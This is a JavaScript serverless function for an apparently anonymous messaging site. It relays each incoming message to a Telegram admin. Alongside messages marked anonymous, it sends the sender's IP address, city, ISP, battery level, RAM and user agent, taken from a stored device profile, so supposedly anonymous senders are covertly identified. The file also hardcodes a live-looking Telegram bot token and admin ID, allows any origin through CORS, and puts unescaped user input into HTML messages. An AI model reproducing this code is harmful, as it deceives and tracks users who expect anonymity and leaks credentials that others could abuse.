/**
 * ═══════════════════════════════════════════════════════
 *  /api/send.js — Vercel Serverless Function
 *  Handles: new message → Telegram admin alert
 *           seen report → Telegram seen notification
 *           admin delete message
 * ═══════════════════════════════════════════════════════
 */

'use strict';

/* ──────────────────────────────────────────────────────
   ENVIRONMENT VARIABLES
   Set these in Vercel Dashboard → Settings → Environment Variables
────────────────────────────────────────────────────── */
const BOT_TOKEN  = process.env.BOT_TOKEN  || "8653934604:AAGE9O4iEkB62yxsXWEGOE2AS_TZNmmMxPA";
const ADMIN_ID   = process.env.ADMIN_ID   || "6048050987";
const FIREBASE_DB_URL = process.env.FIREBASE_DB_URL || "https://cithi-pathan-default-rtdb.firebaseio.com";

/* ──────────────────────────────────────────────────────
   TELEGRAM API HELPER
────────────────────────────────────────────────────── */
async function sendTelegram(method, params) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  const res  = await fetch(url, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify(params)
  });
  return res.json();
}

/* ──────────────────────────────────────────────────────
   BD TIME FORMATTER
────────────────────────────────────────────────────── */
function bdTime(ts) {
  const d = ts ? new Date(ts) : new Date();
  return d.toLocaleString('en-GB', {
    timeZone:  'Asia/Dhaka',
    day:       '2-digit',
    month:     '2-digit',
    year:      'numeric',
    hour:      '2-digit',
    minute:    '2-digit',
    hour12:    true
  }).replace(',', ' —') + ' BD Time';
}

/* ──────────────────────────────────────────────────────
   MAIN HANDLER
────────────────────────────────────────────────────── */
export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const body = req.body;
  if (!body) return res.status(400).json({ error: 'No body' });

  const { action } = body;

  /* ── New Message from User ── */
  if (!action || action === 'newMessage') {
    return handleNewMessage(body, res);
  }

  /* ── Seen Report ── */
  if (action === 'seenReport') {
    return handleSeenReport(body, res);
  }

  /* ── Admin sends reply (webhook handles this in bot.js) ── */
  return res.status(400).json({ error: 'Unknown action' });
}

/* ────────────────────────────────────────────────────── */
async function handleNewMessage(body, res) {
  const { msgData, uid } = body;
  if (!msgData) return res.status(400).json({ error: 'No msgData' });

  // Fetch device info from Firebase
  let deviceInfo = {};
  try {
    const dbRes = await fetch(`${FIREBASE_DB_URL}/users/${uid}/deviceInfo.json`);
    if (dbRes.ok) deviceInfo = await dbRes.json() || {};
  } catch (_) {}

  const d = deviceInfo;

  /* ── Format notification message for Telegram ── */
  const text = `
╔══════════════════════════════╗
🔰 <b>New Message Received</b> 🔰
╚══════════════════════════════╝

🕒 <b>Send Time &amp; Date :</b>
${bdTime(msgData.timestamp)}

🆔 <b>User ID :</b> ${uid}

👤 <b>User Name :</b> ${msgData.anonymous ? 'Unknown User (Anonymous)' : (msgData.name || 'Not Provided')}

📱 <b>WhatsApp :</b> ${msgData.wa || '—'}

🔗 <b>FB Link :</b> ${msgData.fb || '—'}

📱 <b>Device Info :</b> ${d.userAgent?.substring(0,80) || 'Unknown'}

🌍 <b>IP Address :</b> ${d.ip || 'Unknown'}

🏙️ <b>Country :</b> ${d.country || 'Unknown'}

🏠 <b>Division :</b> ${d.region || 'Unknown'}

📍 <b>City :</b> ${d.city || 'Unknown'}

📡 <b>ISP :</b> ${d.isp || 'Unknown'}

📶 <b>Network :</b> ${d.network || 'Unknown'}

🔋 <b>Battery :</b> ${d.battery ? `${d.battery.level} (${d.battery.charging})` : 'Unknown'}

💾 <b>RAM :</b> ${d.ram || 'Unknown'}

🧠 <b>User Agent :</b>
<code>${(d.userAgent || 'Unknown').substring(0,150)}</code>

━━━━━━━━━━━━━━━━━━━━━━━━━
💌 <b>Message :</b>

${msgData.message || '(empty)'}
━━━━━━━━━━━━━━━━━━━━━━━━━

🔘 Reply করতে নিচের Button ব্যবহার করুন।
`.trim();

  /* ── Inline keyboard with Reply button ── */
  const keyboard = {
    inline_keyboard: [[
      {
        text: '📩 Send Reply',
        callback_data: `reply_${uid}_${msgData.msgId}`
      }
    ]]
  };

  try {
    await sendTelegram('sendMessage', {
      chat_id:    ADMIN_ID,
      text,
      parse_mode: 'HTML',
      reply_markup: keyboard
    });
    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}

/* ────────────────────────────────────────────────────── */
async function handleSeenReport(body, res) {
  const { uid, msgData } = body;
  if (!uid) return res.status(400).json({ error: 'No uid' });

  const text = `
╔══════════════════════╗
👁️ <b>MESSAGE SEEN REPORT</b>
╚══════════════════════╝

🆔 <b>UserID :</b> ${uid}

📤 <b>Reply Time :</b>
${bdTime(msgData?.timestamp)}

👁️ <b>Seen Time :</b>
${bdTime(Date.now())}

🔰 This User Seen Your Message ✅
`.trim();

  try {
    await sendTelegram('sendMessage', {
      chat_id:    ADMIN_ID,
      text,
      parse_mode: 'HTML'
    });
    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}
